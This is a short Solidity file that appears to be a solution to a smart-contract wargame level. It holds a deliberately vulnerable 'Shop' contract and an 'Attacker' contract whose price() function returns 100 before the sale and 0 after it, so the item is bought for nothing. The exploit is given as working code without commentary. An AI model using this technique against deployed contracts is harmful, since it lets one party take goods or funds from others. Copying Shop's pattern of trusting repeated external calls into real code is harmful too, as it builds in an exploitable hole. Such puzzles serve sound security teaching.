// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Attacker is Buyer{
    Shop public victim;
    uint constant ORIGINAL_PRICE = 100; 

    constructor (address payable _a) public {
        victim = Shop(_a);
    }

    function attack() public {
        victim.buy();
    }

    function price() override external view returns(uint){
        if (victim.isSold() == false) {
            return ORIGINAL_PRICE;
        } else {
            return 0;
        }
    }
}